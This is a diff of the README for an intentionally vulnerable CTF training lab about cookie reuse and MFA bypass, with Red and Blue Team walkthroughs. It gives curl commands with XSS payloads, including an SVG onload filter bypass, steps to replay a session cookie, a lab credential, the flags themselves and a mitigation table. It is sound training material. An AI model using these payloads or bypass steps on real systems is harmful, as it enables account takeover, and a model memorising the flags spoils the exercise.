@@ -1,151 +1,611 @@
-# Scenario75 Cyber Range — Isolated CTF Training Lab
+# Scenario75 Cyber Range - Davina Ritzky Amarina's Implementation
 
 > **Isolated Training Environment — NOT for production use.**
-> This is intentionally vulnerable training software.
-> Deploy and exploit only inside an isolated cyber-range environment with explicit written authorization.
+> This is intentionally vulnerable training software for an authorized CTF/cyber-range exercise.
+> Deploy and exploit only inside an isolated, air-gapped cyber-range environment with explicit written authorization.
 > Never deploy on public networks, production systems, or without authorization.
 
----
-
-## Purpose
-
-This lab implements a fully functional **Cookies Reuse & MFA Bypass** CTF assessment scenario for cybersecurity engineer practical training. It provides:
+This lab implements a fully functional **Cookies Reuse & MFA Bypass** CTF assessment scenario for cybersecurity engineer practical training. It is an isolated **Red Team vs Blue Team** exercise providing:
 
 - A realistic vulnerable Admin Feedback System with live exploit paths
-- Red Team objectives: XSS, cookie theft, MFA bypass, session replay
-- Blue Team objectives: log analysis, anomaly detection, WAF review
+- Red Team objectives: reconnaissance, XSS, WAF bypass, cookie theft, MFA bypass, session replay
+- Blue Team objectives: log analysis, anomaly detection, WAF review, timeline reconstruction
 - Deterministic attack telemetry for Blue Team analysis
 - Automated deployment and verification scripts
 
 ---
 
-## Architecture
+## 1. Scenario Overview
 
-```
-          Local Client
-               |
-               v
-    localhost:3075 (host loopback only)
-               |
-               v
-          +--------+
-          | Nginx  |  127.0.0.1:3075 -> container:80
-          +--------+
-               |  Docker bridge network (cyberrange)
-               v
-          +--------+
-          | Node.js|  container:3075 (not published to host)
-          +--------+
-               |
-               v
-        Telemetry / in-memory session store
-```
+**Purpose:** Train cybersecurity engineers in attack and defense techniques using a controlled, reproducible, isolated CTF environment. No real systems are targeted.
 
-Nginx (bound to `127.0.0.1:3075`) is the **only host-published service**.
-The Node.js app is reachable only from within the Docker bridge network.
+**Red Team objective:** Exploit the intentionally vulnerable Admin Feedback System to bypass authentication, abuse session cookies, circumvent the rudimentary WAF, and recover the Red Team flag.
 
----
+**Blue Team objective:** Investigate pre-generated deterministic attack telemetry, reconstruct the attack timeline, identify the attacker, decode the embedded clue, and recover the Blue Team flag.
 
-## Proxmox Deployment Assumptions
+**Intentionally vulnerable behaviors:**
+- `robots.txt` exposes sensitive endpoint paths
+- `X-Powered-By` header leaks technology information
+- The WAF blocks only literal `<script>` patterns — SVG-based payloads bypass it
+- The MFA flow issues a `pre_mfa_session` cookie that can be replayed
+- The `adm_sess` administrative session grants full dashboard access
+- The dashboard reflects an XSS payload marker
 
-This lab is designed for deployment on a Proxmox VM in an isolated lab network:
+**Architecture:** Single Linux VM running Docker Compose. All services are isolated on a Docker bridge network.
 
-- The VM runs Docker and Docker Compose
-- Required ports exposed on the VM: **3075** (web), **2275** (SSH)
-- No external internet connectivity required or assumed
-- All traffic stays inside the isolated lab network
+**Target hostname:** `feedback.admin.local`
+**HTTP port:** `3075`
+**SSH port:** `2275`
+
+This environment is intended exclusively for an isolated, authorized lab. Do not connect it to the internet or deploy it on shared infrastructure.
 
 ---
 
-## Quick Start
+## 2. Architecture
 
-Prerequisites:
-- Docker Desktop (or Docker Engine + Compose plugin)
-- Bash (for scripts — use Git Bash or WSL on Windows)
+```
+Host (Linux environment)
+  |
+  +-- 127.0.0.1:3075
+          |
+        Nginx
+          |
+      Docker network (cyberrange bridge)
+          |
+       Node.js app
+          |
+        :3075
+```
+
+- **Node.js** listens on the container interface (`:3075`) so Nginx can reach it via the Docker bridge network using the service name `app`. It is **not** directly published to the host.
+- **Nginx** is the **only published HTTP endpoint** during local setup, bound to `127.0.0.1:3075` on the host.
+- The current verifier confirms that no service uses host networking (`network_mode: host`).
+- Do not publish the Node.js app port directly to the host — that would bypass the Nginx reverse proxy and break the intended architecture.
+
+---
+
+## 3. Prerequisites
+
+Required things on the Linux VM or local development machine:
+
+- Linux (the lab VM target; scripts enforce this for SSH setup)
+- Docker
+- Docker Compose (v2 plugin or standalone)
+- Git
+- Bash
+- `curl`
+- Standard command-line utilities (`grep`, `base64`, `ss`, `getent`)
+
+> **Not required:** Any external infrastructure such as a database or tools such as Wazuh, etc. The lab is fully self-contained.
+
+---
+
+## 4. Start the Lab
 
 ```bash
-# 1. Start the stack
-docker compose up -d
+cd ~/projects/scenario76-davina
+docker compose up -d --build
+docker compose ps
+```
 
-# 2. Wait for health check (~10s), then verify
+Check that both `app` and `nginx` services show as `running` (or `healthy`).
+
+Health check:
+
+```bash
+curl -i http://127.0.0.1:3075/health
+```
+
+Expected successful state: HTTP `200 OK` with a JSON health response. If the health check fails, wait ~10 seconds for the Node.js container to finish its startup health check, then retry.
+
+---
+
+## 5. Automated Verification
+
+```bash
 bash scripts/verify_lab.sh
+```
 
-# 3. Generate deterministic attack logs for Blue Team
+Expected result:
+
+```
+PASSED: 14/14
+FAILED: 0/14
+All checks passed.
+```
+
+The verifier covers:
+
+| Check | What it tests |
+|-------|---------------|
+| 1 | Dashboard authentication protection — unauthenticated request returns 401/403 |
+| 2 | `robots.txt` reconnaissance paths and recon flag present |
+| 3 | `X-Powered-By: SCENARIO75{Node.js}` header |
+| 4 | Login with `admin`/`admin123` returns 200 and sets `pre_mfa_session` cookie |
+| 5 | MFA endpoint returns 200 and sets `adm_sess` cookie |
+| 6 | Authenticated dashboard returns 200 |
+| 7 | Dashboard contains `.xss-payload` class marker |
+| 8 | WAF blocks `<script>` payload with HTTP 403 |
+| 9 | SVG payload bypasses WAF and returns HTTP 200 |
+| 10 | App port not directly published to host |
+| 11 | No service uses host networking |
+| 12 | `generate_logs.sh` produces required deterministic log files and events |
+| 13 | Feedback endpoint accepts a valid message (200) |
+| 14 | Health endpoint returns 200 |
+
+Do not modify `scripts/verify_lab.sh`.
+
+---
+
+## 6. Red Team Investigation
+
+All steps below are authorized lab exercises against the local isolated environment only.
+
+### 6.1 Reconnaissance
+
+```bash
+curl -i http://127.0.0.1:3075/
+curl -i http://127.0.0.1:3075/robots.txt
+```
+
+The root response includes the header:
+
+```
+X-Powered-By: SCENARIO75{Node.js}
+```
+
+The `robots.txt` response reveals sensitive endpoint paths:
+
+```
+Disallow: /api/verify-mfa
+Disallow: /dashboard
+```
+
+It also contains the intended reconnaissance clue/flag: `SCENARIO75{R3c0n_F1ag_R0b0ts_D1sc0v3r3d}`
+
+These are intentional reconnaissance clues built into the lab scenario.
+
+### 6.2 Authentication / Pre-MFA Session
+
+Use the intentionally provided CTF lab credential (`admin`/`admin123`) — this is not a real credential:
+
+```bash
+curl -i \
+  -c /tmp/scenario75-cookies.txt \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin123"}' \
+  http://127.0.0.1:3075/api/login
+```
+
+Inspect the cookie jar:
+
+```bash
+cat /tmp/scenario75-cookies.txt
+```
+
+The `pre_mfa_session` cookie represents a partially-authenticated state — the user has provided credentials but has not yet completed MFA. This cookie is intentionally designed to be abusable in the CTF scenario to demonstrate session management weaknesses.
+
+### 6.3 WAF Test
+
+Test the rudimentary WAF with a conventional `<script>` payload:
+
+```bash
+curl -i \
+  -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"message":"<script>alert(1)</script>"}' \
+  http://127.0.0.1:3075/api/feedback
+```
+
+Expected: **HTTP 403**
+
+The WAF blocks this request because it matches the literal `<script>` pattern. This demonstrates that a simple pattern-matching WAF is in place.
+
+### 6.4 WAF Bypass Test
+
+Test the SVG-based bypass:
+
+```bash
+curl -i \
+  -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"message":"<svg onload=\"alert(1)\">"}' \
+  http://127.0.0.1:3075/api/feedback
+```
+
+Expected: **HTTP 200**
+
+The WAF does not block this payload because it only pattern-matches `<script>`. An SVG element with an inline event handler is equally capable of executing JavaScript in a browser context. This demonstrates that keyword-based blocking is insufficient — robust HTML sanitization is required.
+
+### 6.5 MFA / Administrative Session
+
+Using the `pre_mfa_session` cookie, submit the MFA code:
+
+```bash
+curl -i \
+  -b /tmp/scenario75-cookies.txt \
+  -c /tmp/scenario75-cookies.txt \
+  -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"code":"123456"}' \
+  http://127.0.0.1:3075/api/verify-mfa
+```
+
+Inspect the updated cookie jar:
+
+```bash
+cat /tmp/scenario75-cookies.txt
+```
+
+The `adm_sess` cookie represents a fully authenticated administrative session. This cookie grants access to the protected dashboard. The CTF scenario demonstrates how this session can be obtained by replaying a `pre_mfa_session` — an MFA bypass through insufficient server-side session state enforcement.
+
+### 6.6 Authenticated Dashboard
+
+Request the dashboard with the administrative session cookie:
+
+```bash
+curl -i \
+  -b /tmp/scenario75-cookies.txt \
+  http://127.0.0.1:3075/dashboard
+```
+
+Locate the XSS payload marker:
+
+```bash
+curl -s \
+  -b /tmp/scenario75-cookies.txt \
+  http://127.0.0.1:3075/dashboard | grep -n "xss-payload"
+```
+
+The authenticated dashboard is only accessible with a valid `adm_sess` cookie and contains a `.xss-payload` class marker. This reflects the stored XSS payload demonstrating that user-supplied input (from the feedback endpoint) is rendered in an administrative context without proper output encoding — a high-impact finding.
+
+### 6.7 Red Team Findings
+
+**Attack chain:**
+
+```
+Recon
+→ exposed sensitive paths (robots.txt)
+→ pre-MFA session (admin/admin123 login)
+→ rudimentary WAF (<script> blocked)
+→ SVG bypass (<svg onload=...> accepted)
+→ cookie/session abuse (pre_mfa_session reuse)
+→ administrative session reuse (adm_sess)
+→ authenticated dashboard
+→ authentication/MFA bypass
+```
+
+**Red Team flag:**
+
+```
+SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
+```
+
+---
+
+## 7. Blue Team Investigation
+
+This phase uses deterministic lab telemetry. Generate the logs first:
+
+```bash
 bash scripts/generate_logs.sh
 ```
 
-Access: [http://127.0.0.1:3075](http://127.0.0.1:3075)
+The script prints the actual log directory it selected, for example:
 
----
+```
+[*] Writing simulated attack telemetry to /opt/admin/logs
+```
 
-## Red Team Objectives
+or, in a non-root development environment where `/opt/admin/logs/` is not writable:
 
-| Phase | Objective | Flag |
-|-------|-----------|------|
-| Reconnaissance | Find hidden paths in robots.txt | `SCENARIO75{R3c0n_F1ag_R0b0ts_D1sc0v3r3d}` |
-| WAF bypass | Bypass script-tag filter with SVG payload | — |
-| XSS + cookie theft | Steal pre_mfa_session via stored XSS | — |
-| MFA bypass | Replay pre_mfa_session to get adm_sess | — |
-| Dashboard access | Read final flag on /dashboard | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |
+```
+[*] Writing simulated attack telemetry to .../logs
+```
 
-See [docs/red-team.md](docs/red-team.md) for detailed walkthrough.
+**The log location is determined by `generate_logs.sh` at runtime.** The script attempts to use `/opt/admin/logs/` if it can create and write there; otherwise it falls back to the repository's `logs/` directory. Do not manually create `/opt/admin/logs/` — the script handles this automatically. The verifier (`scripts/verify_lab.sh`) supports both locations.
 
----
+For a non-root development environment, confirm the files exist at the fallback location:
 
-## Blue Team Objectives
+```bash
+ls -lah logs/
+```
 
-| Task | Log path |
+The two important log files (shown here using the repository fallback paths):
+
+| File | Contents |
 |------|----------|
-| Identify attacker IP and timeline | `/opt/admin/logs/access.log` |
-| Find WAF block/bypass sequence | `/opt/admin/logs/access.log` |
-| Identify cookie replay anomaly | `/opt/admin/logs/error.log` |
-| Decode X-Forwarded-For Blue Team flag | access.log line 18:49:30 |
+| `logs/access.log` | Full HTTP access timeline including attacker activity and the embedded Blue Team flag |
+| `logs/error.log` | WAF events, cookie reuse indicators, authentication bypass anomalies |
 
-Blue Team flag: Base64-decode the `X-Forwarded-For` value in the logs → `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`
+> If `generate_logs.sh` selected `/opt/admin/logs/`, substitute that path in the commands below.
 
-See [docs/blue-team.md](docs/blue-team.md) for investigation checklist.
-
----
-
-## Deterministic Log Generation
+### 7.1 Identify the Attacker
 
 ```bash
-bash scripts/generate_logs.sh
+grep '10.10.14.50' logs/access.log
 ```
 
-Writes simulated attack telemetry to `/opt/admin/logs/` (or `./logs/` if not writable):
-- `access.log` — full attack timeline with embedded Blue Team flag
-- `error.log` — WAF events, cookie replay, auth bypass anomalies
+Key findings:
 
-No real network traffic is generated. All data is written locally.
+- **Attacker IP:** `10.10.14.50`
+- **Attacker network:** `10.10.14.0/24`
+- **User-Agent:** `Mozilla/5.0`
+- Legitimate traffic originates from `192.168.1.100` — correlating the source IP narrows the investigation to the suspicious client.
 
----
-
-## Security Boundary
-
-| Boundary | Status |
-|----------|--------|
-| Nginx binds to 127.0.0.1 only | Enforced |
-| App port not published to host | Enforced |
-| No host networking mode | Enforced |
-| No external API calls | Enforced |
-| No real credential theft or persistence | Enforced |
-| No internet-facing deployment | Assumed (Proxmox isolated VM) |
-
----
-
-## Local Development
+### 7.2 Identify Initial WAF Activity
 
 ```bash
-# Install dependencies
-cd app && npm install
-
-# Run tests
-npm test
-
-# Run lint
-npm run lint
+grep '18:50:15' logs/error.log
 ```
+
+This timestamp identifies the first WAF `<script>` block event — the attacker's initial probe and the starting point of the attack timeline.
+
+### 7.3 Identify Successful Dashboard Access
+
+```bash
+grep '18:51:55' logs/access.log
+```
+
+The `/dashboard` endpoint returned HTTP `200` at exactly `18:51:55`. This is the moment the attacker achieved authenticated access — a critical event in the timeline.
+
+### 7.4 Investigate Cookie Reuse
+
+```bash
+grep -i 'CRITICAL' logs/error.log
+grep -i 'cookie' logs/error.log
+```
+
+Cookie reuse indicators should be correlated with the suspicious client IP (`10.10.14.50`) and administrative session activity to build evidence of session hijacking/replay.
+
+### 7.5 Identify Authentication Bypass
+
+```bash
+grep '18:53:10' logs/error.log
+```
+
+Expected finding: an **authentication bypass anomaly** logged at `18:53:10`. This is the log evidence of the MFA bypass step in the attack chain.
+
+### 7.6 Analyze the Encoded X-Forwarded-For Value
+
+```bash
+grep 'X-Forwarded-For' logs/access.log
+```
+
+The log contains the following value:
+
+```
+UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=
+```
+
+The length and character set (alphanumeric plus `+`, `/`, `=` padding) make Base64 a reasonable encoding hypothesis. Decode it:
+
+```bash
+echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
+```
+
+Expected output:
+
+```
+SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
+```
+
+---
+
+## 8. Blue Team Timeline
+
+```
+18:50:15  Suspicious <script> payload blocked by WAF
+   ↓
+          Attacker changes technique
+   ↓
+18:51:55  /dashboard → HTTP 200  (authenticated access achieved)
+   ↓
+          Cookie/session reuse indicators in error.log
+   ↓
+18:53:10  Authentication bypass anomaly logged
+   ↓
+          X-Forwarded-For encoded clue identified in access.log
+   ↓
+          Base64 decoding
+   ↓
+          Blue Team flag: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
+```
+
+---
+
+## 9. Final Infrastructure Validation
+
+```bash
+docker compose ps
+docker compose port app 3075
+docker compose port nginx 80
+docker compose config
+```
+
+Expected state:
+
+- `docker compose port app 3075` — should return **empty** (app has no host port mapping)
+- `docker compose port nginx 80` — should return `127.0.0.1:3075` (Nginx published on expected port)
+- `docker compose config` — should contain no `network_mode: host` entry
+
+Also confirm the health endpoint:
+
+```bash
+curl -i http://127.0.0.1:3075/health
+```
+
+Expected: HTTP `200 OK`.
+
+---
+
+## 10. Hostname Validation
+
+To exercise the lab using the intended hostname, add the following entry to `/etc/hosts` on the lab VM:
+
+```
+127.0.0.1 feedback.admin.local
+```
+
+Then validate:
+
+```bash
+getent hosts feedback.admin.local
+curl -i http://feedback.admin.local:3075/
+```
+
+This is local lab hostname resolution only — it does not require public DNS and has no external network effect. The entry must be added manually; it is not configured automatically by the lab setup.
+
+---
+
+## 11. SSH Validation
+
+SSH access for Blue Team analysts is configured by `scripts/setup_ssh.sh`, which targets the **isolated Proxmox lab VM only**. The script requires the `ANALYST_PASSWORD` environment variable — the credential is never hardcoded.
+
+To run on the lab VM:
+
+```bash
+ANALYST_PASSWORD="<secure-random-password>" bash scripts/setup_ssh.sh
+```
+
+The script:
+- Creates the `analyst` user
+- Configures `sshd` on port `2275`
+- Refuses to run outside the isolated VM (checks for `/etc/cyberrange-isolated`)
+
+Validate SSH is listening (on the lab VM):
+
+```bash
+sudo ss -lntp | grep 2275
+```
+
+Connect:
+
+```bash
+ssh -p 2275 analyst@127.0.0.1
+```
+
+> **Note:** Do not hardcode the analyst password in this README or commit it to the repository. Always pass it via the environment variable as shown above.
+
+---
+
+## 12. Repository / Secret Validation
+
+```bash
+git status
+git status --ignored
+git ls-files | grep -E '(^|/)(\.env|.*\.key|.*\.pem|id_rsa|id_ed25519)'
+```
+
+The following must **not** be committed to the repository:
+
+- Secret values, private keys, `.env` files with real credentials
+- `node_modules/` directories
+- VM disk images or snapshots
+- Generated log files (`logs/*.log`, or `/opt/admin/logs/` if used)
+- Any other generated artifacts
+
+The `.gitignore` enforces most of these exclusions. Verify that `git status --ignored` shows no sensitive files escaping the ignore rules.
+
+---
+
+## 13. Complete Assessment Checklist
+
+### Automated
+
+- [ ] `bash scripts/verify_lab.sh`
+- [ ] 14/14 checks pass
+- [ ] Docker services healthy
+
+### Red Team
+
+- [ ] Recon completed
+- [ ] `robots.txt` analyzed
+- [ ] Pre-MFA session identified
+- [ ] `<script>` blocked (HTTP 403)
+- [ ] SVG bypass demonstrated (HTTP 200)
+- [ ] Administrative session behavior demonstrated
+- [ ] Dashboard accessed
+- [ ] Red Team flag recovered: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`
+
+### Blue Team
+
+- [ ] Logs generated (`bash scripts/generate_logs.sh` — prints the selected log directory)
+- [ ] Attacker IP identified (`10.10.14.50`)
+- [ ] User-Agent identified (`Mozilla/5.0`)
+- [ ] WAF event identified at `18:50:15`
+- [ ] Dashboard HTTP 200 identified at `18:51:55`
+- [ ] Cookie reuse identified in `error.log`
+- [ ] Authentication bypass identified at `18:53:10`
+- [ ] X-Forwarded-For clue identified
+- [ ] Base64 decoded
+- [ ] Blue Team flag recovered: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`
+
+### Infrastructure
+
+- [ ] App not directly published to host
+- [ ] Nginx published on `127.0.0.1:3075`
+- [ ] No host networking
+- [ ] `/health` returns HTTP 200
+- [ ] `feedback.admin.local` resolves locally (if required for the assessment)
+- [ ] SSH on port `2275` configured (if required for the assessment)
+- [ ] No secrets committed to the repository
+
+---
+
+## 14. Presentation Flow
+
+Suggested 15–20 minute flow:
+
+| Time | Topic |
+|------|-------|
+| 1–2 min | Scenario overview and architecture — isolated CTF context, Red vs Blue objectives |
+| 3–5 min | Red Team reconnaissance and attack chain — `robots.txt`, `X-Powered-By`, login, pre-MFA session |
+| 3–4 min | WAF behavior and bypass — `<script>` blocked, SVG payload accepted, why keyword WAF fails |
+| 1–2 min | Administrative session and dashboard impact — `adm_sess` reuse, reflected XSS payload marker |
+| 4–5 min | Blue Team log investigation — attacker IP, WAF event, dashboard 200, cookie reuse, auth bypass |
+| 1–2 min | Base64 analysis and Blue Team flag |
+| 1–2 min | Mitigation summary and final infrastructure validation |
+
+Focus the presentation on:
+
+- **Evidence** — show actual log lines, HTTP responses, cookie values
+- **Timeline** — anchor every finding to a timestamp
+- **Attack chain** — connect each step to the next
+- **Detection** — what Blue Team signals correlate with each Red Team action
+- **Impact** — what an attacker achieves at each stage
+- **Mitigation** — what control would have broken the chain
+
+---
+
+## 15. Mitigation / Lessons Learned
+
+The following defensive improvements address the intentional vulnerabilities in this lab. The current vulnerable behavior is **not** production-safe.
+
+| Vulnerability | Mitigation |
+|---------------|------------|
+| XSS via unencoded output | Use proper context-aware output encoding; never insert untrusted data directly into HTML |
+| Keyword-based WAF | Replace pattern-matching rules with robust HTML sanitization (e.g. DOMPurify or equivalent server-side library) |
+| Session cookie exposure | Set `HttpOnly`, `Secure`, and appropriate `SameSite` flags on all session cookies |
+| MFA bypass via cookie replay | Enforce MFA server-side; invalidate `pre_mfa_session` after successful or failed MFA; bind administrative sessions to verified MFA state |
+| `pre_mfa_session` reuse | Tie session tokens to client fingerprint and enforce single-use or short TTL |
+| Cookie/session anomalies | Detect anomalous reuse of session tokens from different IPs or User-Agents; alert on replayed cookies |
+| Log correlation gaps | Correlate WAF, authentication, and application logs into a unified timeline for faster detection |
+| `robots.txt` information disclosure | Avoid listing sensitive paths in `robots.txt`; it does not restrict access and serves as a reconnaissance aid |
+| Least privilege | Limit what each service and session can access; administrative sessions should have the shortest viable lifetime |
+| Telemetry for incident investigation | Maintain deterministic, structured telemetry in the lab to support reproducible Blue Team exercises |
+
+---
+
+## 16. Cleanup
+
+Stop the lab:
+
+```bash
+docker compose down
+```
+
+This stops and removes containers and the Docker bridge network. No named volumes are defined in this project, so no volume cleanup is required.
 
 ---
 
@@ -157,8 +617,8 @@ scenario76-davina/
 │   ├── src/          Application source
 │   └── test/         Test suite
 ├── nginx/            Nginx reverse proxy config
-├── scripts/          generate_logs.sh, verify_lab.sh
-├── logs/             Local log output (fallback from /opt/admin/logs)
-├── docs/             red-team.md, blue-team.md
+├── scripts/          generate_logs.sh, verify_lab.sh, setup_ssh.sh, deploy.sh
+├── logs/             Log output fallback (used when /opt/admin/logs/ is not writable)
+├── docs/             architecture.md, red-team.md, blue-team.md, deployment.md
 └── docker-compose.yml
 ```
